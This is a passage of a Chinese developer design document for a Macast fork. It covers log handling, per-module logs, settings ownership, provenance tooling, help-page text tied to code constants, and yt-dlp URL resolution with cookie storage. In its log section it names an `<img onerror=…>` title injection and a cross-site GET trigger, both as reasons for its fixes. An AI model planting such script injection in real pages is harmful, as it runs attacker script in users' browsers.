  `appdirs.user_config_dir`；打包好的 `.exe` 永远写 `%LOCALAPPDATA%\xfangfang\Macast`，
  所以"我在临时目录里跑的这份不会动他的设置"这句话，只有源码启动才成立。
- **探针要用的测试流必须支持 Range**：`http.server.SimpleHTTPRequestHandler` 不支持，
  mpv 会在 seek/prefetch 时 `end-file reason=error`、`file_error='no audio or video data played'`
  （和 §6 里 ffmpeg 那条是同一个坑）。`cast_conformance.py` 自带一个最小 Range handler。

### 4.10 日志：三处叠加的膨胀（外加一个注入面）

2026-09 在一台跑了 49 分钟的实例上实测：`macast.log` **10809 行 / 1.35 MB**
（≈27 KB/分钟 ≈ 1.6 MB/小时 ≈ 40 MB/天），而设置页一打开日志面板就把整份文件吃进 DOM。
三个原因叠在一起，只改其中一个都不够：

| 层 | 原因 | 现在 |
|---|---|---|
| 写文件 | 根 logger 用 `logging.FileHandler`（无轮转）；CherryPy 还往**同一个文件**再挂一个不轮转的 handler | 根 logger 换成 `RotatingFileHandler(2 MB × 2 份)`；`log.access_file` / `log.error_file` 留空 |
| 重复写 | `cherrypy.access` 的记录**同时**被 CherryPy 自己的 handler 和根 handler 各写一遍 —— 每行请求出现两次（实测 2 × 2621 行 ≈ 文件的 **64%**） | 去掉 CherryPy 自己的 handler，记录仍经 propagate 落到根 handler（因此才继续有轮转） |
| 读日志 | `/api?query=log` 用 `f.read()` 回整份；前端 `v-html` 把它塞进 DOM（10.5k 个 `<br/>`） | 接口只回末尾 N 行（`?tail=` / `?all=1`，默认 2000 行 / 512 KB），前端 `<pre>{{ }}</pre>` 文本渲染，且切到面板才拉 |

**红线（改动前先读这几条）：**

- **`log.access_file` 必须留空，且只在这个前提下才安全**：CherryPy 的 logger 会 propagate 到
  根 logger，请求日志才继续落在 `macast.log` 里（带轮转）。谁要是给它们设了 `propagate = False`，
  请求日志就**静默消失**——不再有第二份兜底。Part 20 用一条真实记录守着这个前提。
- **日志正文永远不要用 `v-html`**：日志里含**发送端提供**的 DIDL `dc:title` / URL
  （`protocol.py` 会把整段 `CurrentURIMetaData` 打进去），局域网里任何一台设备投一个带
  `<img onerror=…>` 的标题，打开设置页就会执行。现在是 `<pre>{{ macast_log }}</pre>`。
- **清空走 POST**（`clear-log`，loopback/令牌门控）：GET 版会被任意网页用 `<img>` 触发。
  `log-download` 是 GET，所以它和 `log`/`status` 一样在管理门控名单里（Part 20 有用例）。
- **尾部读取必须 `errors='replace'` 并丢掉切出来的半行**：窗口边界必然落在多字节字符中间，
  严格解码会抛 `UnicodeDecodeError`。
- **每次启动由 `clear_env()` → `remove_log_files()` 删掉 `macast.log` 和轮转出的 `.1/.2`**：
  只删日志本身会让旧备份永远留着。

### 4.10b 按模块独立日志（`macast/logsplit.py`，Part 27）

镜像/投屏这类高频插件如果往共享的 `macast.log` 里按帧打日志，核心协议的行会被淹掉。
`logsplit.claim(name)` 给一个 logger 挂上 `logs/<Name>.log`（`RotatingFileHandler`，1 MB × 1 份）
并把 `propagate` 关掉——**记录只落在自己的文件里，绝不进 macast.log**，这条"恰好一处"就是全部设计。

- **认领发生在插件导入时**：`macast.py` 的 `load_from_file` 与 `_load_bundled_plugins`
  两条路径都调 `logsplit.claim_from_module(module)`（看模块顶层的 `logger` 属性）。
  给新插件加独立日志**不需要**改 logsplit，只要它的 logger 是模块级 `logger`。
- **`clear_env()` 同时调 `logsplit.remove_all()`**：启动时清空 `logs/`，与 macast.log 同语义。
- **API 四个端点全部在管理门控名单里**（本机 / HTTPS / 令牌）：`query=log-modules` 列表、
  `query=log&module=<名>` 尾部读取（`整体` 也接受，等价于不带 module）、
  `log-download&module=`、`clear-log` 带 `module=` 字段。不带 module 的 `log` 仍是 macast.log。
- **页面日志面板是下拉切换**（默认「整体日志」），模块行显示文件大小；模块文件被清空后
  选择器自动回落。**红线不变：日志正文永远 `<pre>{{ }}</pre>`，模块日志同样不许 `v-html`。**

### 4.11 「模块设置」面板：配置键的归属（`macast/module_settings.py`，Part 28）

设置页新 tab「模块设置」把持久化配置**按所属模块分组**展示（核心 / 播放器 / 每个已加载插件 /
其他（未归类）），让普通用户知道每个键是谁的。红线与坑：

- **归属表只写在 `module_settings.py`，不散在各插件里**：`CORE_LABELS` / `PLAYER_LABELS` /
  `PLUGIN_LABELS`（按插件文件基名索引）给出中文标签与提示。**不要**改成"扫描插件的
  `SettingProperty` 枚举成员"——枚举别名规则会让 value 相同的成员（如 `PlayerHW_Disable = 0`）
  把 `PlayerSize_Small` 吞成别名，归属会悄悄错。Part 28 用四条漂移用例（仓库全量扫描
  "实际被持久化的键 ⊆ 标签表"、幽灵标签、core 表==枚举、player ⊆ 枚举）代替枚举扫描。
- **扫描"被持久化的键"只认 `Setting.get/set/has/unset(SettingProperty.X` 第一参数**；
  裸引用可能是值比较（mpv.py:602 `!= SettingProperty.PlayerHW_Disable`），`.value` 结尾的是常量。
- **给插件加新的持久化键时，必须同步往对应标签表加条目**，否则漂移用例当场变红。
  没写枚举的老安装副本不会被显示幽灵键（标签 ∩ 实际加载的枚举）。
- **读写都在门控内**：GET `query=module-settings` 返回分组，POST `set-module-setting`
  （表里 `GATE_CODE`，§4.7c —— 它能写自动化钩子的键，值下次投屏就进 `subprocess(shell=True)`）
  改值/删值；拒绝无归属的键；list/dict 值只读（引导去「高级设置」JSON）。
- 由此 raop 升到 **v0.2**：新增 `RAOP_Device_Name`（覆盖 shairport-sync 服务名，缺省仍跟随
  DLNA 友好名），这是它第一个自己的持久化配置。

### 4.12 署名与来源：`scripts/provenance.py` + `docs/Provenance.md`（Part 34）

本仓库是 fork，所以"这段代码是谁写的"是一句**会被读者读到**的陈述。
已定的做法只有一条：**度量，然后按度量结果只加不减**。用户提的"去掉 fork 与所有原项目
信息"这一半不做（细节见 `docs/Provenance.md` §0）。

- **别拿文件头当来源证据，也别拿 `git blame` 单独当证据。** 头标记的是当初的意图：
  `macast/discovery.py`、`protocol_cast.py`、`protocol_group.py`、`protocol_airplay.py`、
  `scripts/verify_cast_airplay.py` 挂着上游的头，blame 却说 0 行是上游的（代码早被重写干净）。
  反过来 blame 也会说谎：**从别的仓库粘进来的文件**（`macast/plugins/**` 来自
  `xfangfang/Macast-plugins`）在本仓库历史里没有祖先，粘贴那条提交会被当成作者 ——
  所以有一份手写的 `VENDORED` 表；**改名/挪位置**同样丢 blame，所以再比 blob SHA
  （<5 行的文件不参与，空文件的 blob 全世界都一样）。
- **vendored 文件禁止盖我们的名**，`ours`/`mixed` 才盖。这是 `problems()` 的第三条规则，
  也是 Part 34 用合成行单独测过的两个方向之一（另一个是"删掉上游声明必红"）。
- **给文件加头是外科手术**：插入点必须留在**顶部连续的注释块**里（§4.5 —— 插件清单只从
  那个块解析，位置歪了插件会静默装不上），而且不能让 docstring 不再是第一条语句。
  `--stamp` 的插入位置由 `notice_index()` 承担，Part 34 既测它、又用**自家解析器**复核
  "盖过名的插件仍被识别"。
- **`macast/ssdp.py` 有第三层**：Coherence 那一支的 MIT 作者群（Tim Potter 等），
  义务主体既不是我们也不是上游，所以**重写掉上游行也不消灭它**（`THIRD_PARTY` 表守着）。
- **台账必须和代码同步**：改完归属就跑 `provenance.py --check --stamp`，再把
  `docs/Provenance.md` 的 `provenance-ledger` 注释行与两张表的数字改成工具算出来的值，
  然后跑套件 —— Part 34 会拿这三处互相比对（漂移当场变红）。它需要完整历史，
  浅克隆会明确报失败而不是假装通过。
- **本机这份克隆就是"明确报失败"的那种**（2026-09-24 实测）：`git cat-file -t
  19879235ef…`（fork 点）报 `could not get object info`，`git log --all` 最早三条是
  `Initial commit` / `First Commit` —— **215 条上游提交的对象根本不在这里**，不是
  `.git/shallow` 那种可以 `--unshallow` 补回来的浅克隆。后果要写明白：
  ① `provenance.py --check` 在这里只输出 `cannot read history`，Part 34 的 6 条用例
  **每次跑都红**，与代码改动无关（本轮三次跑全部如此）；② 因此**这台机器上无法更新台账**，
  改了 `.py` 的归属也就改了 `our_lines`/`upstream_lines`，只能把重算留给有完整历史的克隆
  （判据：`docs/Provenance.md` 的 `provenance-ledger` 行与工具输出一致）。
  **不要**用手算的差值去把文档改到"看起来过"——Part 34 比的是工具输出，不是差值。
- **而且这不是"换一台机器就好了"：fork 点在 GitHub 上也不存在**（2026-09-25 实测
  `gh api repos/pingod/Macast/commits/19879235ef…` → **422 "No commit found for SHA"**）。
  所以 Part 34 那 6 条**在 CI 里也永远红**，"CI 全绿"这一句在本仓库永远说不出口 ——
  而这恰恰是 `--ci` 存在的理由：它不假装绿，而是把"允许红哪些"写成一份可判定的契约
  （见 `scripts/verify_cast_airplay.py` 的 `ci_gate()`）。三条红线都在它的用例里（Part 50 六条合成用例 +
  一条"哨兵必须是本轮真的跑过的 Part 34 用例"）：
  ① Part 34 之外**任何**一条红 → 拒（否则豁免名单会变成新的"沉默区"）；
  ② 豁免的前提必须自己成立：哨兵那条用例（"the ledger is computable here…"）必须在
  Part 34 的用例名单里，且它的红/绿必须与 `git cat-file -e <fork 点>^{commit}` 的实际结果
  **相反**（有历史却还红 = 真漂移，照红处理）。这一条在 `ci_gate()` 里叫 `premise`，
  Part 50 用"哨兵离开 Part 34 名单"和"没有历史却 Part 34 全绿"两个方向各测一次；
  ③ ②里那个"全绿"不是假想题，是**量出来的**（2026-09-25，Linux 容器里一份没有 `.git` 的拷贝）：
  这种环境下 `provenance.py` 根本不输出 `cannot read history`，它先被 git 的
  `fatal: not a git repository` 打死、留下一段 traceback，旧判据看不见这一形，于是哨兵**绿**，
  `--ci` 当场拒绝（`the sentinel contradicts the history: red=False present=False`）。
  现在 `_shallow34` 认两种形状（工具自己的 marker 与 git 的 no-repo），因为
  **"没测任何东西"永远不许读成"测过了且通过"**；`ci_gate()` 收的是调用方算好的布尔值，
  所以"忘了包 OSError ⇒ 无 git 的环境误开豁免"这一格仍是读代码守的、不是用例守的
  （判据坐在套件末尾的 `try/except OSError` 里，verify_cast_airplay.py:17595 起）。
  同一趟还改掉一个自己的错：`--ci` 拒绝时原先在 SUMMARY **之前** `sys.exit(1)`，
  恰好在最该看的时候把清单和总数藏起来；现在门只决定退出码，清单照打（变异体：注入一条
  Part 34 之外的红 ⇒ `EXIT=1` 且 SUMMARY 仍在）。
  也就是说：**台账在哪些机器上可算，这件事本身是一条被测的陈述**，不是环境备注。
- **`macast/media_resolve.py` 里有第三层来源，写在模块头的注释里而不是台账里**（2026-10-03 新增）：
  `STILL_IMAGE_CODECS` 与拒绝码集合、`ADMISSION_TABLE` / `preference()` 的骨架是从
  **castor**（`https://github.com/stupside/castor`，MIT）的 `internal/source/rank/` 转写的，
  两处偏差（不要运行时、直链排在清单前）就写在那段注释里。这与 `macast/ssdp.py` 的
  Coherence 作者群是同一族：**义务主体既不是我们也不是上游**。这一轮**没有**同步动
  `provenance.py` 的 `THIRD_PARTY` 表，理由是诚实而不是遗忘：本克隆算不出台账（见上一条），
  改了表也无法用 `--check` 自证，而 §4.12 明令禁止拿手算差值把文档改到"看起来过"。
  **在有完整历史的克隆上该做的一步**：把 `macast/media_resolve.py` 登记进 `THIRD_PARTY`
  （判据是"重写掉上游行也不消灭它"），再跑 `provenance.py --check --stamp` 与套件，
  由工具而不是我来改 `docs/Provenance.md` 的那两行。署名侧的准确说法是：这两个文件**是我们写的**
  （可以盖 pingod 的头，事实上已经盖了），但 `media_resolve.py` 的头里**必须点名 castor 那两层** —— 那是
  `ssdp.py` 的同一条规矩，不是 `problems()` 第三条（"vendored 文件不许盖我们的名"）管的那种形状：
  转写几张表 ≠ 从零写，也 ≠ 整份搬进来。**`macast/media_relay.py` 不在这一层里**（它头里一句 castor
  都没提，也没有搬来的表）：那里的 `REFUSED_STATUS` 是同一批拒绝码的**第二份写法**（元组 vs 正则），
  Part 59 把两份互相钉住，所以它是**一致性**问题而不是**来源**问题 —— 别把它登记进 `THIRD_PARTY`。

### 4.13 设置页的「帮助」与页宽：会被读到的对外文案（`macast/xml/setting.html`，Part 44）

2026-09-24 之前那份帮助是**上游的 FAQ**：它告诉读者 58880 被占时应用会崩溃（不会——
`AutoPortServer` 另绑随机端口并改名 `Macast(0123)`，见 §4.2）、IINA/Web/Live/PotPlayer
要去下载（本仓库 15 个插件全内置，见 §4.8）、以及一个指向别的仓库的 wiki 链接。
**它从来没有被测红过，因为套件里没有任何一条用例会去读那段散文** —— 这正是 §4.2 末条
（假 ffmpeg 抄真工具的格式）的同一族问题：不提问的检查等于通过的检查。

现在 **Part 44 把文案和代码事实双向绑定**：帮助里每一个数字都问两遍，一遍问页面、
一遍问决定它的那处代码（`utils.DEFAULT_PORT`、`protocol_cast.CAST_PORT`、
`protocol_airplay.AIRPLAY_PORT`、`plugins/{renderer,protocol}/` 的目录清点、
`screen_mirror` 的 `OUTPUTS` / `CAST_STREAM_MAX_BITRATE` / `DLNA_PROFILES` /
`DLNA_PREFILL_SECONDS` / `NO_FRAME_SECONDS`、`Macast.py` 的 `LOG_MAX_BYTES` /
`LOG_BACKUP_COUNT`、`protocol.py` 的 `sub_exts` 与 `cast` 分支的 `_token_present()`、
`appdirs.user_config_dir('Macast', 'xfangfang')`）。**所以改这些常量或配置目录时，
Part 44 会红——那是它在做该做的事**：同一趟里把帮助那句话改掉，别改断言。

- **新增一个标签页 = 必须同时写进帮助**。用例把页面的 `<el-tab-pane label>` 列表和帮助
  「一共 N 个标签」下面那张列表**逐字比对**（两边都必须恰好相等），所以漏写会红，
  多写一个不存在的标签也会红。
- **新增一个投屏目标 / 一档兼容档位 / 一个外部程序依赖**，同理要写进对应段落：
  「N 种目标各自的脾气」的 **N 与 bullet 条数都按 `OUTPUTS` 比对**，且说「没有声音」的
  bullet 集合必须**恰好等于**标签里带「无声音」的目标（现行 = caststream + webrtc，每条还要
  落在**低延迟**那一句上；整段文本里出现一次不算通过——曾经就是这么让"哪条没声音"读错人的），
  `raop.py` / `airplay_mirror.py` 监督的 `shairport-sync` / `uxplay` 各有一条比对。
- **帮助是弹层不是标签页**（顶栏「帮助」按钮，`custom-class="macast-dialog help-dialog"`，
  `append-to-body`）。老链接 `?page=4` 仍然打开它，别把这个兼容拆掉。
- **别把会漂移的数字写进散文**：版本、端口、友好名称、投屏地址一律交给 Vue 插值或
  页面自己的表格；帮助里只留"有常量可绑"的数字。**v0.25 把这条用到了延迟上**：帮助那两个
  bullet 与两张卡片引的 369 / 492 毫秒必须来自 `screen_mirror.MEASURED_LAG_MS`（Part 44 两条
  用例：WebRTC 那条两个数都在、MSE 那条只有 browser 那个并且带着「缓冲边缘」这个限定语 ——
  同一形状的 838 毫秒是探针读播放器缓冲边界的另一段，两个数不许互相替代）。

页宽那一半是同一份文件里的另一件事，也是 Part 44 的后半：
**宽度归视口管，不归 CSS 管**（`#app` 不钉固定宽度，只留 `min(1680px, 100%)` 上限 +
`--pad-x` 内边距；卡片网用 `repeat(auto-fill, minmax(min(100%, 380px), 1fr))` 自己填列）。
四条会被静默拆掉的做法，用例各自盯着：

1. **在 `el-dialog` 的属性里写 `width="…px"`** —— 行内样式会盖过响应式层，CSS 赢不了，
   所以宽度必须写在 `.macast-dialog` / `.help-dialog` 规则里（配 `!important`）。
2. **在 `style=""` 里写像素宽**（日志页的两个下拉、插件页的 select 原来都是这样）——
   窄屏直接撑出横向滚动。改成 class + `min(绝对值, 视口百分比)`。
3. **让标题和它下面的表格当两个网格项** —— 网格会把它们排到不同列，读起来像串了位。
   所以 `<h3 class="section">` 必须和它的内容一起待在同一个 `.pane-block` 里。
4. **`#app` 忘了 `box-sizing: border-box`** —— `width: 100%` 加内边距就整页横向溢出。
5. **「电脑投屏」不许用那张网格** —— 这一页会出现哪几张卡由 `mirror_view.py` 按状态决定，块数不固定；
   `auto-fit` 只收**所有行都空**的轨道，所以「3 列网放 4 张卡」必然把最后一张甩成一列加一大片空。
   现在 `.mirror-wrap` 是 `flex-wrap` + `flex: 1 1 420px`，凑不满的那一行自己摊开；
   `pane-wide` 在这里要另写成 `flex: 0 0 100%`（它是网格属性，flex 不认）。
   Part 44 三条用例分别盯着「flex 且没有 `grid-template-columns`」「`1 1 <px>`」和「通栏卡钉死 100%」。

还有一条是**只有真浏览器 + 真截图才会发现的**：Element UI 把 `.el-dialog` 画成白底，
而这份页面把 `color: var(--text)` 挂在 `<body>` 上，于是深色模式下帮助弹层是
**白底压近白字**（`.el-dialog__body` 自带的 `#606266` 只盖住了没被显式着色的 `h1/td/pre`）。
这不是新引入的，是上游 FAQ 时代就有、只是那时没人读它。
现在 `.macast-dialog` 自带 `background: var(--panel)` 与 `color: var(--text)`，
Part 44 盯着这两条规则还在。**教训：改完前端要按 §10 起一个临时配置目录的真实例，
用真浏览器在宽 / 中 / 窄三档看一遍再收工**（打桩套件从不渲染 DOM，看不见这些）。

### 4.14 网页地址投屏：解析层与中转层（`macast/media_resolve.py` + `macast/media_relay.py`，Part 59）

用户粘贴的是**网页**地址（v0.19 起：甚至整段分享文案），不是视频地址。两件事因此必须同时成立：
**页面那个签名、短命、要求请求头的地址永远不出这台电脑**，以及**"解不出"与"解出来但被剔除"是两句不同的话**。
实现层是核心模块（不是插件）—— 单文件插件不许 pip（§4.8），而这里要的是**外部命令**
`yt-dlp` / `ffprobe`，两者都按 §4.8 那条老规矩在**每次用的时候**按 PATH + 常见目录找
（`EXTRA_BIN_DIRS` 与 `macast_ytdlp.py` 走同一批目录），**所以装上 yt-dlp 不需要重启应用**。
v0.19 在这一层上又加了四件：**DASH 音画合并**、**无声候选过滤**、**分享文案粘贴**、**站点登录态（cookie）**，
以及**投到哪一台设备**的下拉。前四件都在解析层，第五件是核心的接线（复用插件的发现与发送面，
**没有新增一行协议代码**）。

| 红线 | 为什么 |
|---|---|
| **`-J` 而不是 `-g`** | `-g` 只印一条地址并且**把 `http_headers` 丢掉**，而那些头正是这条地址可读的原因。JSON 还带着整条清晰度梯子，`rank()` 才有东西可排 |
| **裸 host 不许交给引擎** | `example.com/watch/7`（没有 scheme）喂给 yt-dlp 会变成对这串文本的**搜索**，回来一个"看起来像这站没有视频"的答案。形状检查在 POST 里，且被拒的网址**不许留下一个 job**（否则页面永远在轮一个不存在的任务） |
| **判定表是有序的、first-match**（`ADMISSION_TABLE` 六行） | 「源站拒绝」与「静态图当视频轨」要**丢**，「探针没问出来」与「只有头没有体」要**留但说清**（`last_resort`）。丢掉的代价是页面上的 `rejected` 数字，而用户靠它区分「这个站解不出」和「解出来了但都不行」—— 把后两行改成丢，卡片就只会说"没有地址" |
| **`STILL_IMAGE_CODECS` 与拒绝码集合是从 castor 逐字搬来的** | 前者是 ffprobe 会把海报报成视频轨的那批 codec；后者 `401/403/404/410` —— `media_resolve._REFUSED_STATUS` 与 `media_relay.REFUSED_STATUS` 是**同一个集合的两份写法**（一个正则、一个元组），Part 59 把它们互相钉住。只匹配文字（`Server returned 403 Forbidden`）会把 500 也读成拒绝，那正是上面那行理由会被静默改掉的方式 |
| **排序与 castor 故意相反：直链排在清单之前** | 我们的中转能在直链上**翻译 Range**（观众能拖），清单只能转封装成"一直在变大的文件"（写完之前没有可信长度，所以拖不动）。castor 把 master 排前面是因为梯子是它那个引擎的**回退信号**，而我们自己供字节。改回顺序就必须同时改这两句话 |
| **先合并，再过滤 —— 顺序是承重的** | 真站取证（2026-10-03，bilibili）：DASH 的梯子把**画面一条地址、声音另一条地址**分开交，于是页面上最高的那一条投出去**没有声音**。`plan()` 见到 `audio_url` 就答 `merge`，ffmpeg 把那条音轨当**第二个输入**（各自的请求头写在各自的 `-i` 前面），中转的**供流形状不变**；`Candidate.silent` 因此要求 `not probe.audio_codec` **且** `not self.audio_url`。**如果把过滤写在合并前面，bilibili 那张卡片会整段空掉** —— 每一行都"没有音轨"，而它们其实全都是可投的。剩下的真无声行仍然不进卡片（`visible()` 交回 `(rows, hidden)`，页面印「另外 N 条只有画面…」），因为把「投上去没声音」留成一条会播的按钮，就是这条功能当初的 bug 报告本身。**那个「这条没有音轨」的徽标是故意留着的第二道防线**：按今天的走法它永不出现（被过滤掉的行根本不到卡片），但它一旦哪天过滤放宽就必须立刻是对的 —— 而且它的 `v-if` **两个操作数都要在**：只写 `!c.audio_codec` 会把纯音频那条（`relay_reason()` 自己就明说这是有声投屏）标成坏视频。用例两条各问一次（"徽标按 `describe()` 的两个答案键控"与"无声行不进卡片"），少一条就会让另一条变成空话 |
| **粘贴可以是整段分享文案，但"是不是地址"必须先问整段** | `looks_like_url()` 先看**整段**是不是一个地址（单字段 + scheme），只有它不是才用 `_SHARE_URL` 去**挖**里面的地址。顺序反过来会让 `https://example.com/a 后面那句话` 变成一次"看起来合法的"粘贴而把尾巴带进地址里。字符类**显式排除全角标点**（`，。、；：！？（）【】《》“”`）—— 抖音那句就是 `…https://v.douyin.com/iAbc/，复制打开抖音…`，半角 `.,;:!?` 靠 `rstrip` 收。**裸 host 规则照旧成立**：`extract_share_urls` 只回带 scheme 的东西，所以 `example.com/watch/7` 在那里仍然是"一个地址都没有"，由调用方用 `looks_like_url` 的原话拒绝。挖出多个时**第一条交给引擎、条数交给卡片**，多 P 主帖不许静默丢掉其余部分 |
| **引擎自己的拒绝原话必须上卡片，而且读的必须是它的 `ERROR:` 标记行** | `engine_note()` **优先取第一条 `ERROR:`**，取不到才回落"第一条非空文本"，截到 200 字符，因为真 stderr 后面还跟着 traceback，而"页面上出现 traceback"不是解释。**第一行不是可取的**（2026-10-05 量到的）：一份**混排的 jar**（一条好行 + 一条坏行）过了我们的粘贴校验（它数的是**cookie 条数**，不是行数），于是引擎先打 `WARNING: skipping cookie file entry due to invalid length 1: …` —— 那句话里有 `cookie`，`needs_cookies()` 就把它读成「这通常是站点要会话 cookie」，把用户送去他**已经填过**的那块面板。`--no-warnings` **关不掉它**：那条警告走 `write_string`（`yt_dlp/cookies.py:1386`），**根本不经 logger**，所以它照旧落在 stderr 第一行。两句契约各一条用例，而且**两边都问**：警告在前时 `engine_note()` 交回 `ERROR:` 那一行（截断后仍然不含 `cookie` 那个词），以及没有任何标记时第一行**照样要说话**（这一路的前提就是"引擎自己的原话是答案"，只认 `ERROR:` 的读取器会把一句写了散文的 extractor 报成一个裸退出码）。**为什么不在页面判**：这是我们对**别人那句话**的读取，只能有一个主人能被测试钉住（同一理由决定了 `relay_reason()`、`plan()`、`describe()` 全部住在后端） |
| **cookie 是凭据：只落 0600 的独立文件，永不进设置 JSON** | jar 在 `SETTING_DIR/resolve_cookies.txt`，`os.open(..., 0o600)` 写临时名再 `os.replace`（并发解析永不打开半份文件），**故意不备份旧的那份** —— 一个会主动覆盖它的功能不该留下副本。`macast_setting.json` 里只有 `Resolve_Cookie_Browser`（浏览器**名字**），因为那份文件人们会导出贴进 bug 报告。页面与日志**永远只报条数**。粘贴时先校验（`cookie_jar_state` 回 `(cookies, bad_lines)`，上限 `COOKIE_JAR_MAX_BYTES = 256 KiB`），因为**空/坏 jar 引擎根本不报错**，它只是匿名解出更少的地址，用户读到的下一句就是"这页没有视频" |
| **jar 校验里 `#HttpOnly_` 那一行是 cookie，不是注释** | 浏览器导出的 Netscape jar 用这个前缀标记 HttpOnly 属性，而**会话 cookie 通常全都带它** —— 我们这边它是注释，于是整份导出被判成「没有一条能读懂的 cookie」而**拒绝粘贴**，正好是这块面板唯一要收的那份文件；混排的 jar 还会少报条数，「已保存 N 条 cookie」就成了谎。判据只有一个主人：**照 `http.cookiejar.MozillaCookieJar._really_load` 的顺序来** （先在原始行的 index 0 剥前缀，再跳空行与 `#`）。所以剥完之后还要再问一次注释 （`#HttpOnly_# …` 仍是注释），而缩进的 `  #HttpOnly_…` 对引擎也不是 cookie —— 把它算成一条就是许一个 yt-dlp 从来不会加载的登录态。**这一条本来早就被"覆盖"过**：唯一的旧用例喂的是 `'# HttpOnlyCookieJar'`（带空格的**头注释**），真实形状零覆盖 —— §4.2「假 ffmpeg 抄虚构格式」同族，只是这次抄的是**注释行的一个变体**。（2026-10-04 在写文档读这段代码时抓到，随 v0.19.0 一起发）
| **页面里的地址要先按 JSON 自己的规矩解一次转义** | PHP 站把播放器配置交给 `json_encode` 时，**默认把每一个 `/` 写成 `\/`**（`JSON_UNESCAPED_SLASHES` 要显式开），于是 `file":"https:\/\/vip...\/index.m3u8"` 是一份**合法 JSON** 的那个地址，而我们的字面扫描看不见它：URL 字符类为了不在引号或空格处截断，**同样会在反斜杠处截断** ⇒ 匹配从每个 `\/` 之后重新开始、从那个 `/` 起头、报出 `/index.m3u8` ⇒ `absolute_url` 把它按页面宿主解成一个**这台服务器的根路径**。2026-10-05 在报错的那页量到的正是这个：`route1Data` 里两条真 m3u8，交回来的是 `https://pomo.mom/index.m3u8`（404）。修法 `_json_unescape()` 只解三种形状（`\\`、`\/`、ASCII `\uXXXX`），**一趟、不重叠**（这也正是 JSON 的规矩：`\\/` 是转义反斜杠 + 一个普通 `/`），且 **0x80 以上的码点原样留着** —— 那是别人的标题，改写它只会让扫过的文本和页面不一样而没有任何好处。同一个 helper 也喂 `og:video` 与 `<source>`，所以不是"给某个站开的洞"。**这一格的价值在于它把「需要 JavaScript」这句话的适用边界收窄了**：这一路 `api.php?type=parse` 自己的答复就是 `code:500`，也就是说**它从来不是 JS 站**，只是我们把它的地址读丢了 |
| **空结果要说清是哪一种空，而且是四句话** | `ResolveJob._why_empty()` 交回四种句子之一：① 引擎说「这不是我有读者能读的站」（`engine_says_unsupported`）⇒ 「页面里没有读到视频地址（yt-dlp 说：…；`JS_HOLE`）」；② 引擎说别的拒绝 ⇒ 只带它自己的原话；③ 这台机器没有 `yt-dlp` ⇒ 「只能抓 HTML 里写明的地址」，**并且不许出现 `JS_HOLE`**（那台机器上根本没跑过引擎，说"要 JS"是没有见证者的陈述）；④ 装了引擎却一个地址都没交回来 ⇒ 才说 `JS_HOLE`。**两张词表各自的主人不能互借答案**：`_COOKIE_WORDS`（`needs_cookies`）判的是"这站要会话"，`_UNSUPPORTED_WORDS`（`engine_says_unsupported`）判的是"我们没有这个站的读者"，把后者写成"任何 ERROR"就会把 500 和 cookie 墙都贴上 JS 那句，**而用户读到第二个解释就会去做错的那一件**（cookie 墙的正确动作是卡片下面的面板）。`unable to extract` **故意不在** `_UNSUPPORTED_WORDS` 里：那句话的意思是"引擎有这个 extractor 并且它回答了这页"，把它改标成我们的局限是这台分类器唯一能把人送去错地方的方式。`JS_HOLE` 是**唯一真值点**：卡片、帮助弹层与这条句子共用它，用例读常量而不是抄散文 |
| **`--cookies-from-browser` 的白名单每次读都复查** | `COOKIE_BROWSERS` 就是 yt-dlp 认识的那批名字（`CHROMIUM_BASED_BROWSERS | {firefox, safari}` = 我们这九个，一字不差）；`_cookie_browser_spec()` 在**取用的路上**再判一次（`Setting.get` 之后、进 argv 之前），因为那个值坐在**可手改的高级设置 JSON** 里 —— 它只有一个主人还不够，写它的门和读它的门都得认同一张表。默认是空＝不读；**文件优先于浏览器**（粘贴的那份是用户明确给的，浏览器那份是猜的）。没有登录表单也不弹窗：**Macast 不代用户登录**（那要在每台机器养一个真浏览器，而这里的解析靠命令行） |
| **那一栏读的是引擎的语法，不是"一个浏览器名字"，而且资料目录必须逐字节往返** | 这台行的症状（2026-10-05，`.68`）是 Vivaldi 把 cookie 库存在**非默认目录**里，而我们的白名单只认名字 ⇒ 除了"这台永远读不到"没有第二种答复。现在按 `__init__.py:397-415` 的**真文法**收：`BROWSER[+KEYRING][:PROFILE][::CONTAINER]`（`re.fullmatch`，Windows 盘符里的冒号在 `:PROFILE` 之内**合法**，靠 `:` 切第一段才不会把 `C:\Users\…` 切坏）。**`名字:资料目录` 是允许的形状**：存进去什么就交回什么（页面那个 `el-select` 因此要 `filterable allow-create` —— Element UI 的 `getOption(value)` 会退到 `label: value`，所以后端读回的 `vivaldi:C:\…` 照样渲染得出来），且 `.strip().lower()` **绝不能整段做**（那是他的路径，不是名字；名字半边单独 lower，profile 半边逐字节）。`::CONTAINER`（Firefox 多容器）**写和读两侧都拒**，并给一句自己的话 —— 引擎认识它，我们的白名单不该假装不认识；`+KEYRING` 同样不进这一栏（那是我们从不替他挑的东西，进了 argv 就是一条没人复核过的启动参数）。**没有 `os.path.isdir` 校验**：引擎那边 `:PROFILE` 既接受绝对路径也接受 `Default` 这种相对档案名（`_is_path` 只认 `os.path.sep`/`altsep`，因此**平台相关**），在这里判"存不存在"会把合法写法判成坏值 |
| **「这句点的是本机这一侧」的四格，每一格都必须给自己的下一步** | 引擎那句拒绝里含 `cookie` 不等于"站点要会话"（上面那两条同一族）。`cookie_source_problem(note)` 把**我们这一侧**的失败归成 `COOKIE_PROBLEMS = ('locked','not_found','decrypt','bad_profile')` 四态，`status()` 里 `'needs_cookies': needs_cookies(note) and not cookie_source_problem(note)` —— **这一取反才是那张卡片不会把人送去装扩展的原因**，而页面只按 `resolve.cookie_problem` 的值说话。四个词表片段全部对着**本机装的 `yt_dlp/cookies.py` 逐条量过可达性**，这不是修饰：**一条永远烧不到的行会让用例看起来覆盖了**。被删掉的四条：`cannot decrypt v10/v11 cookies` 与 `unknown cookie version`（`cookies.py:482/489/515/542` 是**逐条目**的 `logger.warning`，那份库其余部分开得好好的 ⇒ 解析照旧返回地址，一条"只在该什么都不说时才烧"的行会把一次**成功**判成 cookie 故障），`unknown browser:`（:124）与 `unsupported keyring:`（:1159）（**按构造不可达**：名字进 argv 前后各查一次白名单，`+KEYRING` 那一半根本不从这个侧出来）。而**上面 `engine_note()` 那一格量到的 `write_string` 警告是这条规则的例外** —— 它不经 logger，所以 `--quiet` 拿它没办法，只能由读取侧跳过它。**`bad_profile` 是 Opera 专属的形状，且必须排在 `not_found` 之前**：它先把"这个浏览器不接受 `:资料目录`"打在 ERROR 级，再转身去找一个**用那个档案名拼出来的路径**里的库 —— 后面那句 `could not find … cookies database` 才是 